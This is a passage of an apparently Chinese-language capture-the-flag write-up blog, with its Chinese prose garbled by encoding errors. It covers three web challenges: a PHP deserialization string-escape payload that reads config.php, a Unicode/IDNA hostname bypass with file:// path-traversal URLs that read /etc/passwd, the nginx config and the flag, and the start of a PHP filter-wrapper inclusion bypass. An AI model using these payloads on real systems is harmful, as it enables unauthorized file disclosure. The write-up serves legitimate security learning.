&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&amp;#34;;}s:5:&amp;#34;photo&amp;#34;;s:10:&amp;#34;config.php&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;â­å‚è€ƒäº†å…¶ä»–çš„å¥½å¤šåšå®¢ï¼Œè¿™é‡Œçš„ç‚¹è®²çš„å¾ˆæ¨¡ç³Šï¼ŒåŸæ¥é•¿åº¦ä¸º5çš„å­—ç¬¦ä¸²å˜æˆäº†é•¿åº¦ä¸º6çš„ï¼Œåº”è¯¥æ˜¯æ›´ä¸å¯èƒ½è¯»ä¸åˆ°payloadçš„ã€‚&lt;/p&gt;
&lt;p&gt;å—åˆ°äº†è¿™ä½å¸ˆå‚…çš„åšå®¢&lt;a class="link" href="https://blog.csdn.net/weixin_44077544/article/details/102703489" target="_blank" rel="noopener"
&gt;[0CTF 2016]piapiapia&lt;/a&gt;ï¼Œæˆ‘å°è¯•äº†ä¸‹&lt;code&gt;$profile&lt;/code&gt;å±æ€§å…¶å®æ˜¯ä¸€ä¸ª&lt;strong&gt;å…³è”æ•°ç»„&lt;/strong&gt;ï¼Œæ˜¯é”®å€¼å¯¹å½¢å¼çš„ï¼Œå¹¶ä¸”å­—ç¬¦ä¸²å¯èƒ½æ˜¯åµŒå¥—èµ·æ¥çš„ï¼Œå½¢å¦‚&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;profile&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;a:2:{s:8:&amp;#34;nickname&amp;#34;;s:5:&amp;#34;where&amp;#34;;s:5:&amp;#34;photo&amp;#34;;s:3:&amp;#34;233&amp;#34;;}&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;2333&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$s1&lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;profile&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;serialize&lt;/span&gt;($s1);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœæ˜¯&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;O&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;7&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;profile&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;{&lt;span style="color:#a6e22e"&gt;s&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;;&lt;span style="color:#a6e22e"&gt;s&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;56&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;a:2:{s:8:&amp;#34;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;nickname&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;;s:15:&amp;#34;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;where&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;;s:5:&amp;#34;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;photo&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;;s:3:&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;233&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;;}&amp;#34;&lt;/span&gt;;&lt;span style="color:#a6e22e"&gt;s&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;6&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;upload&amp;#34;&lt;/span&gt;;&lt;span style="color:#a6e22e"&gt;s&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;2333&amp;#34;&lt;/span&gt;;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ç§æ ¼å¼çš„ï¼Œå‡å¦‚æˆ‘ä»¬çš„payloadæ˜¯ä¿®æ”¹ä¸Šé¢çš„uploadï¼Œåœ¨ä¸€ä¸ªå­—ç¬¦ä¸²æ€»é•¿åº¦så¦‚ä¸Šé¢çš„56è¯»å–æ‰€æœ‰å˜é•¿çš„hackerä»¥åï¼Œåˆ°äº†æˆ‘ä»¬çš„payloadåœ°æ–¹ï¼Œæ­£å¸¸æŠŠæˆ‘ä»¬æ„é€ çš„uploadè¯»å–ä¸ºå¯¹è±¡ï¼Œè€Œåé¢çœŸæ­£çš„uploadå­—ç¬¦ä¸²å°±è¢«èˆå»äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103923.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æŠ¥é”™æ˜¯å› ä¸ºnicknameæˆ‘ä»¬ä¼ å…¥çš„æ˜¯æ•°ç»„å½¢å¼çš„ï¼Œæºä»£ç é‡Œç›´æ¥å¯¹æ•°ç»„è¿›è¡Œæ“ä½œè‚¯å®šæ˜¯æŠ¥é”™çš„ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦çš„åªæœ‰photoæ­£å¸¸å³å¯ï¼Œå¯ä»¥çœ‹åˆ°åé¢æˆ‘ä»¬æ–‡ä»¶æ›´æ–°æˆåŠŸäº†ã€‚&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹é¡µé¢çš„å›¾ç‰‡å†…å®¹&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103720.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;base64è§£ç &lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103747.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="suctf-2019pythonginx"&gt;[SUCTF 2019]Pythonginx
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310100334.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æ•´ç†ä¸€ä¸‹æºç &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;getUrl&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; url &lt;span style="color:#f92672"&gt;=&lt;/span&gt; request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#34;url&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; parse&lt;span style="color:#f92672"&gt;.&lt;/span&gt;urlparse(url)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;hostname
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; host &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;suctf.cc&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;æˆ‘æ‰Œ your problem? 111&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; parts &lt;span style="color:#f92672"&gt;=&lt;/span&gt; list(urlsplit(url))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; parts[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; host &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;suctf.cc&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;æˆ‘æ‰Œ your problem? 222 &amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; host
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; newhost &lt;span style="color:#f92672"&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; h &lt;span style="color:#f92672"&gt;in&lt;/span&gt; host&lt;span style="color:#f92672"&gt;.&lt;/span&gt;split(&lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; newhost&lt;span style="color:#f92672"&gt;.&lt;/span&gt;append(h&lt;span style="color:#f92672"&gt;.&lt;/span&gt;encode(&lt;span style="color:#e6db74"&gt;&amp;#39;idna&amp;#39;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;decode(&lt;span style="color:#e6db74"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; parts[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;join(newhost)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;#å»æ‰ url ä¸­çš„ç©ºæ ¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; finalUrl &lt;span style="color:#f92672"&gt;=&lt;/span&gt; urlunsplit(parts)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;split(&lt;span style="color:#e6db74"&gt;&amp;#39; &amp;#39;&lt;/span&gt;)[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; parse&lt;span style="color:#f92672"&gt;.&lt;/span&gt;urlparse(finalUrl)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;hostname
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; host &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;suctf.cc&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;urlopen(finalUrl)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;æˆ‘æ‰Œ your problem? 333&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‰ä¸ªiféƒ½æ˜¯åˆ¤æ–­&lt;code&gt;host == 'suctf.cc'&lt;/code&gt;ï¼Œä½†æ˜¯éœ€è¦æœ€åä¸€ä¸ªhoståˆ¤æ–­æˆåŠŸæ‰å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶åº”è¯¥ä½¿ç”¨çš„æ˜¯phpä¼ªåè®®ï¼Œä½†æ˜¯å‰é¢çš„ä¸ä¼šäº†ï¼Œå»çœ‹wpã€‚å¤§æ¦‚çœ‹çš„æ„æ€è¿˜æ˜¯ç”¨unicodeæ¬ºéª—ï¼Œç›¸å…³é¢˜ç›®[[ASIS 2019]Unicorn shop](#[ASIS 2019]Unicorn shop)ï¼Œä½¿ç”¨unicodeç»è¿‡è§£æä»¥åè¿˜æ˜¯åŸæ¥çš„å­—ç¬¦ï¼Œä½†æ˜¯å¯ä»¥ç»•è¿‡åˆ¤æ–­&lt;code&gt;==&lt;/code&gt;ï¼Œå›è¿‡å¤´æ¥æ³¨æ„åˆ°äº†&lt;strong&gt;ç¬¬äºŒä¸ª&lt;/strong&gt;ifä¸­æœ‰&lt;code&gt;newhost.append(h.encode('idna').decode('utf-8'))&lt;/code&gt;è¿›è¡Œäº†ä¸€æ³¢ç¼–ç ï¼Œé‚£ä¹ˆé—®é¢˜å°±å‡ºåœ¨äº†è¿™é‡Œã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ‰¾å‡ºéšä¾¿ä¸€ä¸ªhosté‡Œå­—ç¬¦çš„å…¶ä»–unicodeå€¼ï¼Œè¿™ä¸ªå€¼åœ¨ç»è¿‡ç¼–ç ä»¥åè¿˜å¯ä»¥å˜æˆåŸæ¥çš„å­—æ¯ã€‚å…¶ä»–wpéƒ½æ‰¾çš„æ˜¯æœ€åçš„å­—æ¯&lt;code&gt;c&lt;/code&gt;ï¼Œé‚£ä¹ˆæˆ‘å°±æ‰¾ç¬¬ä¸€ä¸ªå­—æ¯&lt;code&gt;s&lt;/code&gt;éªŒè¯ä¸€ä¸‹ï¼Œè´´ä¸€ä¸ªunicodeçš„ç½‘ç«™ï¼šhttps://www.compart.com/en/unicode/U+0073ï¼Œè¿›å…¥ç½‘ç«™ä»¥åå¯ä»¥æœç´¢ï¼Œç„¶åä¸‹é¢æœ‰ç›¸å…³çš„å­—ç¬¦ï¼Œ&lt;strong&gt;éœ€è¦å¤šè¯•å‡ ä¸ª&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310102326.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘é€‰å‡ºçš„æ˜¯è¿™ä¸ªå­—ç¬¦&lt;code&gt;ğ¬&lt;/code&gt;ï¼Œæˆ‘ä»¬å…ˆä½¿ç”¨urlç¼–ç ä¸€ä¸‹é˜²æ­¢å‚æ•°å‡ºç°é”™è¯¯ï¼Œå°è¯•è¯»ä¸€ä¸‹passwdï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310102513.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;flagå¹¶ä¸åœ¨å…¶ä¸­ï¼Œå¹¶ä¸”ä¹Ÿä¸å†æ ¹ç›®å½•ä¸‹ï¼Œæ ¹æ®é¢˜ç›®ä¸­æœ‰&lt;code&gt;nginx&lt;/code&gt;åº”è¯¥æ˜¯ä¸€ä¸ªæŒ‡è·¯çš„ï¼Œå»è¯»ä¸€è¯»nginxçš„é…ç½®æ–‡ä»¶ã€‚ä»å¸ˆå‚…é‚£å­¦åˆ°çš„nginxé…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®ï¼Œä»¥åè¯´ä¸å®šè‡ªå·±ä¹Ÿç”¨å¾—åˆ°ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginxã€/usr/local/nginx/conf/nginx.conf&lt;/p&gt;
&lt;p&gt;ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf&lt;/p&gt;
&lt;p&gt;ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service&lt;/p&gt;
&lt;p&gt;æ¨¡å—ï¼š/usr/lisb64/nginx/modules&lt;/p&gt;
&lt;p&gt;åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx&lt;/p&gt;
&lt;p&gt;ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html&lt;/p&gt;
&lt;p&gt;æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;è¯»é…ç½®æ–‡ä»¶&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/local/nginx/conf/nginx.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103257.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;è¯»flag&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/fffffflag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103323.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;å‚è€ƒçš„åšå®¢é“¾æ¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.xmsec.cc/suctf19-wp/" target="_blank" rel="noopener"
&gt;https://www.xmsec.cc/suctf19-wp/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://xz.aliyun.com/t/6042#toc-24" target="_blank" rel="noopener"
&gt;https://xz.aliyun.com/t/6042#toc-24&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener"
&gt;https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bsidescf-2020had-a-bad-day"&gt;[BSidesCF 2020]Had a bad day
&lt;/h1&gt;&lt;p&gt;çœ‹è¿™ä¸ªæ ‡é¢˜æˆ‘æ¨ä¸€ä¸‹OWRLD ORDERçš„&lt;a class="link" href="https://www.bilibili.com/video/BV1Bb411K7Gd" target="_blank" rel="noopener"
&gt;Have a nice day&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;é¡µé¢ä¸¤ä¸ªæŒ‰é’®ï¼Œä¸€ä¸ªåº·ç‹—ç‹—ç…§ç‰‡ï¼Œä¸€ä¸ªåº·çŒ«çŒ«ç…§ç‰‡ï¼Œç‚¹æŒ‰é’®ä»¥åurlå°±ä¼šæ”¹å˜ä¸º&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-url" data-lang="url"&gt;/index.php?category=woofers
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å°è¯•è¾“å…¥flagä¼šæ˜¾ç¤º&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310175019.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;åªèƒ½æœ‰&lt;code&gt;woofers&lt;/code&gt;å’Œ&lt;code&gt;meowers&lt;/code&gt;å¯ä»¥é€šè¿‡ï¼Œå°è¯•äº†ä¸‹phpçš„&lt;code&gt;filter&lt;/code&gt;ä¼ªåè®®è¯»æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310175611.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;è¯»å‡ºæ¥äº†ï¼Œä½†æ˜¯è§£å¯†ä»¥åç‹—ç‹—å’ŒçŒ«çŒ«è¿™ä¸¤ä¸ªç½‘é¡µæ²¡å•¥ä½œç”¨ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-html" data-lang="html"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;center&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &amp;lt;&lt;span style="color:#f92672"&gt;h4&lt;/span&gt;&amp;gt; Woof! Woof! &amp;lt;/&lt;span style="color:#f92672"&gt;h4&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;/&lt;span style="color:#f92672"&gt;center&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;img&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;style&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;width:100%&amp;#34;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;src&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;img/dog/&amp;lt;?php echo rand(1,10)?&amp;gt;.jpg&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¤šå°è¯•ä»¥åå‘ç°å¯ä»¥è¯»&lt;code&gt;index&lt;/code&gt;ï¼Œä¸‹é¢æ˜¯ä¸»è¦çš„æºç ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;category&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($file)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;( &lt;span style="color:#a6e22e"&gt;strpos&lt;/span&gt;( $file, &lt;span style="color:#e6db74"&gt;&amp;#34;woofers&amp;#34;&lt;/span&gt; ) &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strpos&lt;/span&gt;( $file, &lt;span style="color:#e6db74"&gt;&amp;#34;meowers&amp;#34;&lt;/span&gt; ) &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strpos&lt;/span&gt;( $file, &lt;span style="color:#e6db74"&gt;&amp;#34;index&amp;#34;&lt;/span&gt;)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;include&lt;/span&gt; ($file &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Sorry, we currently only support woofers and meowers.&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°ifåˆ¤æ–­ä¸­éœ€è¦å­—ç¬¦ä¸²åŒ…å«&lt;code&gt;woofers&lt;/code&gt;ã€&lt;code&gt;meowers&lt;/code&gt;ã€&lt;code&gt;index&lt;/code&gt;ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨filterä¼ªåè®®ä¸­æ’å…¥å­—ç¬¦ä¸²ç»•è¿‡åˆ¤æ–­å³å¯ã€‚&lt;/p&gt;
